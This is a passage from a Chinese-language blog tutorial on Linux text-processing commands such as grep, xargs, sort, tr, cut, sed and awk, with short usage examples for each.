class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="print-的界定符"><a href="#print-的界定符" class="headerlink" title="-print 的界定符"></a>-print 的界定符</h3><p>默认使用“\n”作为文件的界定符；<br>-print 0 使用“\0”作为文件的定界符，这样就可以搜索包含空格的文件；<br>​</p><h2 id="二、grep-文本搜索"><a href="#二、grep-文本搜索" class="headerlink" title="二、grep 文本搜索"></a>二、grep 文本搜索</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> match_patten <span class="token function">file</span>  // 默认访问匹配行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li>-o 只输出匹配的文本行</li><li>-v 只输出没有匹配的文本行</li><li>-c 统计文件中包含文本的次数</li><li>-n 打印匹配的行号</li><li>-i 搜索时忽略大小写</li><li>-l 只打印文件名</li></ul><p>​</p><h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><p>在多级目录中对文本递归搜索：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">"flag{"</span> <span class="token keyword">.</span> -R -n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>匹配多个模式：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> -e <span class="token string">"flag{"</span> -e <span class="token string">"vitural"</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>grep 输出以 0 为界定符的文件名（-z）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">"test"</span> file* -lZ <span class="token operator">|</span> <span class="token function">xargs</span> -0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>综合应用：将日志中的所有带 where 条件的 sql 查询语句查找出来：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> LOG.* <span class="token operator">|</span> <span class="token function">tr</span> a-z A-Z <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"FROM "</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"WHERE"</span> <span class="token operator">></span> b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h2 id="三、xargs-命令行参数转换"><a href="#三、xargs-命令行参数转换" class="headerlink" title="三、xargs 命令行参数转换"></a>三、xargs 命令行参数转换</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>xargs 能够将<strong>输入数据转化为特定命令的命令行参数</strong>。这样，可以配合很多命令来组合使用，比如 grep、find。<br>​</p><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li>-d 定义界定符</li><li>-n 指定输出为多行</li><li>-l {} 指定替换字符串，这个字符串在 xargs 扩展时会被替换掉，用于待执行的命令需要多个参数时</li><li>-0：指定 0 为界定符</li></ul><p>​</p><h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><p>将<strong>多行</strong>输出转化为<strong>单行</strong>输出：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">xargs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>将<strong>单行</strong>转化为<strong>多行</strong>输出：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">xargs</span> -n 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-n：指定每行显示的字段数</p></blockquote><h2 id="四、sort-排序"><a href="#四、sort-排序" class="headerlink" title="四、sort 排序"></a>四、sort 排序</h2><h3 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li>-n 按数字进行排序</li><li>-d 按字典序进行排序</li><li>-r 逆序排序</li><li>-k N 指定按第 N 列排序</li></ul><p>​</p><h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> -nrk 1 file.txt<span class="token function">sort</span> -bd data // 忽略像空格之类的前导空白字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><h2 id="五、uniq-消除重复行"><a href="#五、uniq-消除重复行" class="headerlink" title="五、uniq 消除重复行"></a>五、uniq 消除重复行</h2><h3 id="消除重复行"><a href="#消除重复行" class="headerlink" title="消除重复行"></a>消除重复行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> unsort.txt <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="统计各行在文件中出现的次数"><a href="#统计各行在文件中出现的次数" class="headerlink" title="统计各行在文件中出现的次数"></a>统计各行在文件中出现的次数</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> unsort.txt <span class="token operator">|</span> <span class="token function">uniq</span> -c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="找出重复行"><a href="#找出重复行" class="headerlink" title="找出重复行"></a>找出重复行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> unsort.txt <span class="token operator">|</span> <span class="token function">uniq</span> -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>可指定每行中需要比较的重复内容：-s 开始位置 -w 比较字符数</p></blockquote><p>​</p><h2 id="六、用-tr-进行转换"><a href="#六、用-tr-进行转换" class="headerlink" title="六、用 tr 进行转换"></a>六、用 tr 进行转换</h2><h3 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 12345 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'0-9'</span> <span class="token string">'9876543210'</span> //加解密转换，替换对应字符<span class="token function">cat</span> text<span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\t'</span> <span class="token string">' '</span>  //制表符转空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><h3 id="tr-删除字符"><a href="#tr-删除字符" class="headerlink" title="tr 删除字符"></a>tr 删除字符</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'0-9'</span> // 删除所有数字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="c-求补集"><a href="#c-求补集" class="headerlink" title="-c 求补集"></a>-c 求补集</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -c <span class="token string">'0-9'</span> //获取文件中所有数字<span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -d -c <span class="token string">'0-9 \n'</span>  //删除非数字数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><h3 id="tr-压缩字符"><a href="#tr-压缩字符" class="headerlink" title="tr 压缩字符"></a>tr 压缩字符</h3><p>tr -s 压缩文本中出现的重复字符，最常用于压缩多余的空格:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -s <span class="token string">' '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><p>tr 中可用各种字符类：</p><ul><li>alnum：字母和数字</li><li>alpha：字母</li><li>digit：数字</li><li>space：空白字符</li><li>lower：小写</li><li>upper：大写</li><li>cntrl：控制（非可打印）字符</li><li>print：可打印字符</li></ul><p>​</p><p>使用方法：tr [:class:] [:class:]</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h2 id="七、cut-按列切分文本"><a href="#七、cut-按列切分文本" class="headerlink" title="七、cut 按列切分文本"></a>七、cut 按列切分文本</h2><h3 id="截取文件的第-2-列和第-4-列"><a href="#截取文件的第-2-列和第-4-列" class="headerlink" title="截取文件的第 2 列和第 4 列"></a>截取文件的第 2 列和第 4 列</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -f2,4 filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="去除文件中除了第-3-列的所有列"><a href="#去除文件中除了第-3-列的所有列" class="headerlink" title="去除文件中除了第 3 列的所有列"></a>去除文件中除了第 3 列的所有列</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -f3 --complement filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="d-指定界定符"><a href="#d-指定界定符" class="headerlink" title="-d 指定界定符"></a>-d 指定界定符</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> -f2 -d<span class="token string">";"</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="cut-取的范围"><a href="#cut-取的范围" class="headerlink" title="cut 取的范围"></a>cut 取的范围</h3><ul><li>N- 第 N 个字段到结尾</li><li>-M 第 1 个字段为 M</li><li>N-M N 到 M 个字段</li></ul><h3 id="cut-取的单位"><a href="#cut-取的单位" class="headerlink" title="cut 取的单位"></a>cut 取的单位</h3><ul><li>-b 以字节为单位</li><li>-c 以字符为单位</li><li>-f 以字段为单位（使用定界符）</li></ul><p>​</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>打印第 1 到 5 个字符：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -c 1-5 <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>打印前 2 个字符：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -c -2 <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截取文本的第 5 到第 7 列：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> string <span class="token operator">|</span> <span class="token function">cut</span> -c5-7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="八、paste-按列拼接文本"><a href="#八、paste-按列拼接文本" class="headerlink" title="八、paste 按列拼接文本"></a>八、paste 按列拼接文本</h2><p>将两个文本按列拼接到一起</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file112<span class="token function">cat</span> file2colinbook<span class="token function">paste</span> file1 file21 colin2 book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认的定界符是制表符，可以用-d 指明定界符：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">paste</span> file1 file2 -d <span class="token string">","</span>1,colin2,book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="九、wc-统计行和字符的工具"><a href="#九、wc-统计行和字符的工具" class="headerlink" title="九、wc 统计行和字符的工具"></a>九、wc 统计行和字符的工具</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$wc</span> -l <span class="token function">file</span> // 统计行数<span class="token variable">$wc</span> -w <span class="token function">file</span> // 统计单词数<span class="token variable">$wc</span> -c <span class="token function">file</span> // 统计字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十、sed-文本替换利器"><a href="#十、sed-文本替换利器" class="headerlink" title="十、sed 文本替换利器"></a>十、sed 文本替换利器</h2><h3 id="首处替换"><a href="#首处替换" class="headerlink" title="首处替换"></a>首处替换</h3><p>替换每一行的第一处匹配的 text：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/text/replace_text/'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="全局替换"><a href="#全局替换" class="headerlink" title="全局替换"></a>全局替换</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/text/replace_text/g'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认替换后，输出替换后的内容，如果需要直接替换原文件,使用-i：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/text/repalce_text/g'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="移除空白行"><a href="#移除空白行" class="headerlink" title="移除空白行"></a>移除空白行</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'/^$/d'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="变量转换"><a href="#变量转换" class="headerlink" title="变量转换"></a>变量转换</h3><p>已匹配的字符串通过标记&amp;来引用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> this is en example <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\w+/[&amp;]/g'</span>$<span class="token operator">></span><span class="token punctuation">[</span>this<span class="token punctuation">]</span>  <span class="token punctuation">[</span>is<span class="token punctuation">]</span> <span class="token punctuation">[</span>en<span class="token punctuation">]</span> <span class="token punctuation">[</span>example<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="子字符串标记"><a href="#子字符串标记" class="headerlink" title="子字符串标记"></a>子字符串标记</h3><p>第一个匹配的括号内容使用标记 1 来引用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/hello\([0-9]\)/\1/'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="双引号求值"><a href="#双引号求值" class="headerlink" title="双引号求值"></a>双引号求值</h3><p>sed 通常用单引号来引用，也可使用双引号，使用双引号后，双引号会对表达式求值：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/<span class="token variable">$var</span>/HLLOE/'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当使用双引号时，可以在 sed 样式和替换字符串中指定变量：</p><pre class="line-numbers language-bash"><code class="language-bash">eg:p<span class="token operator">=</span>pattenr<span class="token operator">=</span>replaced<span class="token keyword">echo</span> <span class="token string">"line con a patten"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">"s/<span class="token variable">$p</span>/<span class="token variable">$r</span>/g"</span>$<span class="token operator">></span>line con a replaced<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其它示例"><a href="#其它示例" class="headerlink" title="其它示例"></a>其它示例</h3><p>字符串插入字符，将文本中每行内容（ABCDEF） 转换为 ABC/DEF：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/^.\{3\}/&amp;\//g'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="十一、awk-数据流处理工具"><a href="#十一、awk-数据流处理工具" class="headerlink" title="十一、awk 数据流处理工具"></a>十一、awk 数据流处理工具</h2><h3 id="脚本结构"><a href="#脚本结构" class="headerlink" title="脚本结构"></a>脚本结构</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">' BEGIN{ statements } statements2 END{ statements } '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><ol><li>执行 begin 中语句块；</li><li>从文件或 stdin 中读入一行，然后执行 statements2，重复这个过程，直到文件全部被读取完毕；</li><li>执行 end 语句块；</li></ol><h3 id="print-打印当前行"><a href="#print-打印当前行" class="headerlink" title="print 打印当前行"></a>print 打印当前行</h3><p>使用不带参数的 print 时，会打印当前行：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"line1\nline2"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'BEGIN{print "start"} {print } END{ print "End" }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>print 以逗号分割时，参数以空格定界：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">' {var1 = "v1" ; var2 = "V2"; var3="v3"; \print var1, var2 , var3; }'</span>$<span class="token operator">></span>v1 V2 v3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用-拼接符的方式（<code>-</code>作为拼接符）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">' {var1 = "v1" ; var2 = "V2"; var3="v3"; \print var1"-"var2"-"var3; }'</span>$<span class="token operator">></span>v1-V2-v3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="特殊变量（NR-NF-0-1-2）"><a href="#特殊变量（NR-NF-0-1-2）" class="headerlink" title="特殊变量（NR NF $0 $1 $2）"></a>特殊变量（NR NF $0 $1 $2）</h3><p>NR：表示记录数量，在执行过程中对应当前行号；<br>NF：表示字段数量，在执行过程总对应当前行的字段数；<br>$0：这个变量包含执行过程中当前行的文本内容；<br>$1：第一个字段的文本内容；<br>$2：第二个字段的文本内容；</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"line1 f2 f3\n line2 \n line 3"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print NR":"<span class="token variable">$0</span>"-"<span class="token variable">$1</span>"-"<span class="token variable">$2</span>}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打印每一行的第二和第三个字段：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>, <span class="token variable">$3</span>}'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计文件的行数：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">' END {print NR}'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>累加每一行的第一个字段：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"1\n 2\n 3\n 4\n"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'BEGIN{num = 0 ;print "begin";} {sum += <span class="token variable">$1</span>;} END {print "=="; print sum }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="传递外部变量"><a href="#传递外部变量" class="headerlink" title="传递外部变量"></a>传递外部变量</h3><pre class="line-numbers language-bash"><code class="language-bash">var<span class="token operator">=</span>1000<span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print vara}'</span> vara<span class="token operator">=</span><span class="token variable">$var</span> <span class="token comment" spellcheck="true">#  输入来自stdin</span><span class="token function">awk</span> <span class="token string">'{print vara}'</span> vara<span class="token operator">=</span><span class="token variable">$var</span> <span class="token function">file</span> <span class="token comment" spellcheck="true"># 输入来自文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="用样式对-awk-处理的行进行过滤"><a href="#用样式对-awk-处理的行进行过滤" class="headerlink" title="用样式对 awk 处理的行进行过滤"></a>用样式对 awk 处理的行进行过滤</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'NR &lt; 5'</span> <span class="token comment" spellcheck="true">#行号小于5</span><span class="token function">awk</span> <span class="token string">'NR==1,NR==4 {print}'</span> <span class="token function">file</span> <span class="token comment" spellcheck="true">#行号等于1和4的打印出来</span><span class="token function">awk</span> <span class="token string">'/linux/'</span> <span class="token comment" spellcheck="true">#包含linux文本的行（可以用正则表达式来指定，超级强大）</span><span class="token function">awk</span> <span class="token string">'!/linux/'</span> <span class="token comment" spellcheck="true">#不包含linux文本的行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="设置定界符"><a href="#设置定界符" class="headerlink" title="设置定界符"></a>设置定界符</h3><p>使用-F 来设置定界符（默认为空格）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> -F: <span class="token string">'{print <span class="token variable">$NF</span>}'</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="读取命令输出"><a href="#读取命令输出" class="headerlink" title="读取命令输出"></a>读取命令输出</h3><p>使用 getline，将外部 shell 命令的输出读入到变量 cmdout 中：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{"grep root /etc/passwd" | getline cmdout; print cmdout }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="在-awk-中使用循环"><a href="#在-awk-中使用循环" class="headerlink" title="在 awk 中使用循环"></a>在 awk 中使用循环</h3><pre class="line-numbers language-bash"><code class="language-bash">for<span class="token punctuation">(</span>i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>10<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>print <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token punctuation">}</span>for<span class="token punctuation">(</span>i <span class="token keyword">in</span> array<span class="token punctuation">)</span><span class="token punctuation">{</span>print array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><p>eg:以下字符串，打印出其中的时间串：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$echo</span> <span class="token string">'2015_04_02 20:20:08: mysqli connect failed, please check connect info'</span><span class="token operator">|</span><span class="token function">awk</span> -F<span class="token string">':'</span> <span class="token string">'{print <span class="token variable">$1</span> ":" <span class="token variable">$2</span> ":" <span class="token variable">$3</span>; }'</span><span class="token operator">></span>2015_04_02 20:20:08<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><p>而如果需要将后面的部分也打印出来(时间部分和后文分开打印)：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$echo</span> <span class="token string">'2015_04_02 20:20:08: mysqli connect failed, please check connect info'</span><span class="token operator">|</span><span class="token function">awk</span> -F<span class="token string">':'</span> <span class="token string">'{print <span class="token variable">$1</span> ":" <span class="token variable">$2</span> ":" <span class="token variable">$3</span>; print <span class="token variable">$4</span>;}'</span><span class="token operator">></span>2015_04_02 20:20:08<span class="token operator">></span>mysqli connect failed, please check connect info<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​</p><p>以逆序的形式打印行：(tac 命令的实现）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">seq</span> 9<span class="token operator">|</span> \<span class="token function">awk</span> <span class="token string">'{lifo[NR] = <span class="token variable">$0</span>; lno=NR} \END{ for(;lno>-1;lno--){print lifo[lno];}} '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><h3 id="awk-结合-grep-找到指定的服务，然后将其-kill-掉"><a href="#awk-结合-grep-找到指定的服务，然后将其-kill-掉" class="headerlink" title="awk 结合 grep 找到指定的服务，然后将其 kill 掉"></a>awk 结合 grep 找到指定的服务，然后将其 kill 掉</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -fe<span class="token operator">|</span> <span class="token function">grep</span> msv8 <span class="token operator">|</span> <span class="token function">grep</span> -v MFORWARD <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> -9<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="awk-实现-head、tail-命令"><a href="#awk-实现-head、tail-命令" class="headerlink" title="awk 实现 head、tail 命令"></a>awk 实现 head、tail 命令</h3><p>head</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'NR&lt;=10{print}'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>tail</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'{buffer[NR%10] = <span class="token variable">$0</span>;} END{for(i=0;i&lt;11;i++){ \print buffer[i %10]} } '</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><h3 id="打印指定列"><a href="#打印指定列" class="headerlink" title="打印指定列"></a>打印指定列</h3><p>awk 方式实现</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -lrt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$6</span>}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>cut 方式实现</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -lrt <span class="token operator">|</span> <span class="token function">cut</span> -f6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="打印指定文本区域"><a href="#打印指定文本区域" class="headerlink" title="打印指定文本区域"></a>打印指定文本区域</h3><p>确定行号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">seq</span> 100 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'NR==4,NR==6{print}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>确定文本，打印处于 start_pattern 和 end_pattern 之间的文本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'/start_pattern/, /end_pattern/'</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><h3 id="awk-常用内建函数"><a href="#awk-常用内建函数" class="headerlink" title="awk 常用内建函数"></a>awk 常用内建函数</h3><ul><li>index(string,search_string)：返回 search_string 在 string 中出现的位置</li><li>sub(regex,replacement_str,string)：将正则匹配到的第一处内容替换为 replacement_str;</li><li>match(regex,string)：检查正则表达式是否能够匹配字符串；</li><li>length(string)：返回字符串长度</li></ul><p>​</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{"grep root /etc/passwd" | getline cmdout; print length(cmdout) }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​</p><p>printf 类似 c 语言中的 printf，对输出进行格式化：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">seq</span> 10 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{printf "->%4s\n", <span class="token variable">$1</span>}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="十二、迭代文件中的行、单词和字符"><a href="#十二、迭代文件中的行、单词和字符" class="headerlink" title="十二、迭代文件中的行、单词和字符"></a>十二、迭代文件中的行、单词和字符</h2><h3 id="迭代文件中的每一行"><a href="#迭代文件中的每一行" class="headerlink" title="迭代文件中的每一行"></a>迭代文件中的每一行</h3><p>while 循环法</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> file.txt改成子shell:<span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token punctuation">(</span>while <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span>done<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>awk 法</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file.txt<span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="迭代一行中的每一个单词"><a href="#迭代一行中的每一个单词" class="headerlink" title="迭代一行中的每一个单词"></a>迭代一行中的每一个单词</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">for</span> word <span class="token keyword">in</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token keyword">echo</span> <span class="token variable">$word</span><span class="token punctuation">;</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="迭代每一个字符"><a href="#迭代每一个字符" class="headerlink" title="迭代每一个字符"></a>迭代每一个字符</h3><p><code>${string:start_pos:num_of_chars}</code>：从字符串中提取一个字符；(bash 文本切片）<br><code>${#word}</code>：返回变量 word 的长度</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">for</span><span class="token 